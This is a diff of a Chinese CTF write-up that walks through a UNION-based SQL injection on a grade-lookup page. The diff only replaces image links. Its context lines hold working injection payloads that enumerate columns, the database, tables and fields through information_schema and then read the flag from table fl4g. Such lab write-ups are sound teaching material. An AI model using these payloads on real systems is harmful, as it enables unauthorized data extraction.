@@ -2,11 +2,11 @@
 
 
 
-![image-20210116204114667](../../..//image/image-20210116204114667.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657553771-image-20210116204114667.png)
 
 进入环境
 
-![image-20210116204208447](../../..//image/image-20210116204208447.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657577100-image-20210116204208447.png)
 
 成绩查询
 
@@ -18,7 +18,7 @@
 
 输入了一个1’
 
-![image-20210116204323060](../../..//image/image-20210116204323060.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657601891-image-20210116204323060.png)
 
 有回显
 
@@ -32,7 +32,7 @@
 1' order by 4#
 ```
 
-![image-20210116204746099](../../..//image/image-20210116204746099.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657622983-image-20210116204746099.png)
 
 
 
@@ -46,7 +46,7 @@
 -1' union select 1,2,3,4 #
 ```
 
-![image-20210116205304815](../../..//image/image-20210116205304815.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657656060-image-20210116205304815.png)
 
 然后查询数据库
 
@@ -54,7 +54,7 @@
 -1' union select database(),2,3,4 #
 ```
 
-![image-20210116205716940](../../..//image/image-20210116205716940.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657669122-image-20210116205716940.png)
 
 
 
@@ -76,7 +76,7 @@
 -1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#
 ```
 
-![image-20210116211523015](../../..//image/image-20210116211523015.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657687342-image-20210116211523015.png)
 
 得到表明
 
@@ -90,7 +90,7 @@ flag在fl4g里
 -1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = 'fl4g'#
 ```
 
-![image-20210116211703512](../../..//image/image-20210116211703512.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657704272-image-20210116211703512.png)
 
 得到字段名
 
@@ -100,7 +100,7 @@ flag在fl4g里
 -1' union select 1,skctf_flag,3,4 from fl4g#
 ```
 
-![image-20210116211818667](../../..//image/image-20210116211818667.png)
+![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618657720834-image-20210116211818667.png)
 
 得到flag
 
